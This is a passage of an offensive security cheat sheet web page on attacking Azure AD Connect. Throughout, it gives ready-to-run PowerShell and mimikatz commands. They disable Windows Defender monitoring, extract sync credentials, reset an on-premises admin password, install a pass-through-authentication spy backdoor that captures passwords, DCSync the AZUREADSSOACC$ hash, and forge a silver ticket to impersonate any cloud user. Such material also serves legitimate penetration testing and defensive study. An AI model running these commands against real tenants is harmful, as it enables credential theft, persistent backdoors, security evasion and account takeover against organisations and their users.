<a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a><span class="n">SID</span><span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="err">–</span><span class="n">12</span><span class="err">–</span><span class="n">1</span><span class="p">-[</span><span class="n">base10</span><span class="p">(</span><span class="n">a1</span><span class="p">)]-[</span> <span class="n">base10</span><span class="p">(</span><span class="n">a2</span><span class="p">)]-[</span> <span class="n">base10</span><span class="p">(</span><span class="n">a3</span><span class="p">)]-[</span> <span class="n">base10</span><span class="p">(</span><span class="n">a4</span><span class="p">)]</span>
</code></pre></div>
<p>For example, the representation of <code>6aa89ecb-1f8f-4d92–810d-b0dce30b6c82</code> is <code>S-1–12–1–1789435595–1301421967–3702525313–2188119011</code></p>
<h2 id="azure-ad-connect">Azure AD Connect</h2>
<p>Check if Azure AD Connect is installed : <code>Get-ADSyncConnector</code></p>
<ul>
<li>For <strong>PHS</strong>, we can extract the credentials</li>
<li>For <strong>PTA</strong>, we can install the agent</li>
<li>For <strong>Federation</strong>, we can extract the certificate from ADFS server using DA</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Set-MpPreference</span> <span class="n">-DisableRealtimeMonitoring</span> <span class="nv">$true</span>
<a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Copy-Item</span> <span class="n">-ToSession</span> <span class="nv">$adcnct</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">AADInternals</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">4</span><span class="p">.</span><span class="n">5</span><span class="p">.</span><span class="n">zip</span> <span class="n">-Destination</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Documents</span>
<a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Expand-Archive</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">AADInternals</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">4</span><span class="p">.</span><span class="n">5</span><span class="p">.</span><span class="n">zip</span> <span class="n">-DestinationPath</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">AADInternals</span>
<a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">AADInternals</span><span class="p">\</span><span class="n">AADInternals</span><span class="p">.</span><span class="n">psd1</span>
<a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Get-AADIntSyncCredentials</span>
<a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a>
<a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a><span class="c"># Get Token for SYNC account and reset on-prem admin password</span>
<a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$passwd</span> <span class="p">=</span> <span class="n">ConvertToSecureString</span> <span class="s1">&#39;password&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="p">(</span><span class="s2">&quot;&lt;Username&gt;@&lt;TenantName&gt;.onmicrosoft.com&quot;</span><span class="p">,</span> <span class="nv">$passwd</span><span class="p">)</span>
<a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="n">GetAADIntAccessTokenForAADGraph</span> <span class="n">-Credentials</span> <span class="nv">$creds</span> <span class="err">–</span><span class="n">SaveToCache</span>
<a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Get-AADIntUser</span> <span class="n">-UserPrincipalName</span> <span class="n">onpremadmin</span><span class="nv">@defcorpsecure</span><span class="p">.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ImmutableId</span>
<a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Set-AADIntUserPassword</span> <span class="n">-SourceAnchor</span> <span class="s2">&quot;&lt;IMMUTABLE-ID&gt;&quot;</span> <span class="n">-Password</span> <span class="s2">&quot;Password&quot;</span> <span class="n">-Verbose</span>
</code></pre></div>
<ol>
<li>Check if PTA is installed : <code>Get-Command -Module PassthroughAuthPSModule</code></li>
<li>Install a PTA Backdoor
    <div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="nb">Install-AADIntPTASpy</span>
<a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="nb">Get-AADIntPTASpyLog</span> <span class="n">-DecodePasswords</span>
</code></pre></div></li>
</ol>
<h3 id="azure-ad-connect-password-extraction">Azure AD Connect - Password extraction</h3>
<p>Credentials in AD Sync : C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf</p>
<table>
<thead>
<tr>
<th>Tool</th>
<th>Requires code execution on target</th>
<th>DLL dependencies</th>
<th>Requires MSSQL locally</th>
<th>Requires python locally</th>
</tr>
</thead>
<tbody>
<tr>
<td>ADSyncDecrypt</td>
<td>Yes</td>
<td>Yes</td>
<td>No</td>
<td>No</td>
</tr>
<tr>
<td>ADSyncGather</td>
<td>Yes</td>
<td>No</td>
<td>No</td>
<td>Yes</td>
</tr>
<tr>
<td>ADSyncQuery</td>
<td>No (network RPC calls only)</td>
<td>No</td>
<td>Yes</td>
<td>Yes</td>
</tr>
</tbody>
</table>
<div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">fox-it</span><span class="p">/</span><span class="n">adconnectdump</span>
<a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a><span class="c"># DCSync with AD Sync account</span>
</code></pre></div>
<h3 id="azure-ad-connect-msol-accounts-password-and-dcsync">Azure AD Connect - MSOL Account's password and DCSync</h3>
<p>You can perform <strong>DCSync</strong> attack using the MSOL account.</p>
<p>Requirements:
  * Compromise a server with Azure AD Connect service
  * Access to ADSyncAdmins or local Administrators groups</p>
<p>Use the script <strong>azuread_decrypt_msol.ps1</strong> from @xpn to recover the decrypted password for the MSOL account:
* <code>azuread_decrypt_msol.ps1</code>: AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545
* <code>azuread_decrypt_msol_v2.ps1</code>: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c</p>
<p>Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.</p>
<h3 id="azure-ad-connect-seamless-single-sign-on-silver-ticket">Azure AD Connect - Seamless Single Sign On Silver Ticket</h3>
<blockquote>
<p>Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA)</p>
<p>Seamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer account <strong>AZUREADSSOC</strong> is created in the on-prem AD.</p>
</blockquote>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> The password of the AZUREADSSOACC account never changes.</p>
<p>Using <a href="https://autologon.microsoftazuread-sso.com/">https://autologon.microsoftazuread-sso.com/</a> to convert Kerberos tickets to SAML and JWT for Office 365 &amp; Azure</p>
<ol>
<li>NTLM password hash of the AZUREADSSOACC account, e.g. <code>f9969e088b2c13d93833d0ce436c76dd</code>. 
    <div class="highlight"><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;lsadump::dcsync /user:AZUREADSSOACC$&quot;</span> <span class="n">exit</span>
</code></pre></div></li>
<li>AAD logon name of the user we want to impersonate, e.g. <code>elrond@contoso.com</code>. This is typically either his userPrincipalName or mail attribute from the on-prem AD.</li>
<li>SID of the user we want to impersonate, e.g. <code>S-1-5-21-2121516926-2695913149-3163778339-1234</code>.</li>
<li>Create the Silver Ticket and inject it into Kerberos cache:
    <div class="highlight"><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;kerberos::golden /user:elrond</span>
<a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="s2">/sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234</span>
<a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a><span class="s2">/domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd</span>
<a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a><span class="s2">/target:aadg.windows.net.nsatc.net /service:HTTP /ptt&quot;</span> <span class="n">exit</span>
</code></pre></div></li>
<li>Launch Mozilla Firefox</li>
<li>Go to about:config and set the <code>network.negotiate-auth.trusted-uris preference</code> to value <code>https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com</code></li>
<li>Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty.</li>
</ol>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.alteredsecurity.com/post/introduction-to-365-stealer">Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack</a></li>
<li><a href="https://www.youtube.com/watch?v=51FSvndgddk&amp;list=WL">Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) !!</a></li>
<li><a href="https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94">Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9</a></li>
<li><a href="https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597">Azure AD Pass The Certificate - Mor - Aug 19, 2020</a></li>
<li><a href="https://zhiliaxu.github.io/app-service-managed-identity.html">Get Access Tokens for Managed Service Identity on Azure App Service</a></li>
<li><a href="https://o365blog.com/post/mdm/">Bypassing conditional access by faking device compliance - September 06, 2020 - @DrAzureAD</a></li>
<li><a href="https://github.com/0xJs/CARTP-cheatsheet/blob/main/Authenticated-enumeration.md">CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course</a></li>
<li><a href="https://www.netspi.com/blog/technical/cloud-penetration-testing/get-azurepasswords/">Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen</a></li>
<li><a href="https://akimbocore.com/article/introduction-to-pentesting-azure/">An introduction to penetration testing Azure - Akimbocore</a></li>
<li><a href="https://blog.netspi.com/running-powershell-scripts-on-azure-vms/">Running Powershell scripts on Azure VM - Netspi</a></li>
<li><a href="https://blog.netspi.com/attacking-azure-cloud-shell/">Attacking Azure Cloud shell - Netspi</a></li>
<li><a href="https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/">Maintaining Azure Persistence via automation accounts - Netspi</a></li>
<li><a href="https://www.smartspate.com/detecting-an-attacks-on-active-directory-with-azure/">Detecting an attacks on active directory with Azure - Smartspate</a></li>
<li><a href="https://www.youtube.com/watch?v=l_pnNpdxj20">Azure AD Overview</a> </li>
<li><a href="https://www.youtube.com/watch?v=IcSATObaQZE">Windows Azure Active Directory in plain English</a></li>
<li><a href="https://medium.com/@kamran.bilgrami/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f">Building Free Active Directory Lab in Azure - @kamran.bilgrami</a> </li>
<li><a href="https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a">Attacking Azure/Azure AD and introducing Powerzure - SpecterOps</a></li>
<li><a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">Azure AD connect for RedTeam - @xpnsec</a></li>
<li><a href="https://blog.netspi.com/azure-privilege-escalation-using-managed-identities/">Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020</a></li>
<li><a href="https://www.lares.com/hunting-azure-admins-for-vertical-escalation/">Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020</a></li>
<li><a href="https://dirkjanm.io/introducing-roadtools-and-roadrecon-azure-ad-exploration-framework/">Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema</a></li>
<li><a href="https://medium.com/@talthemaor/moving-laterally-between-azure-ad-joined-machines-ed1f8871da56">Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020</a></li>
<li><a href="https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html">AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhière (bak) - 2020-04-20</a></li>
<li><a href="https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/">Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter</a></li>
<li><a href="https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html">The Art of the Device Code Phish - Bobby Cooke</a></li>
<li><a href="https://hideandsec.sh/books/cheatsheets-82c/page/azure-ad">AZURE AD cheatsheet - BlackWasp</a></li>
</ul>

  <hr>
<div class="md-source-file">
  <small>
    
      Last update:
      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">February 15, 2023</span>
      
    
  </small>
</div>





                
              </article>
            </div>
          
          
        </div>
        
          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
            Back to top
          </a>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tracking", "toc.integrate", "navigation.top"], "search": "../../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.b78d2936.min.js"></script>
      
    
  </body>
</html>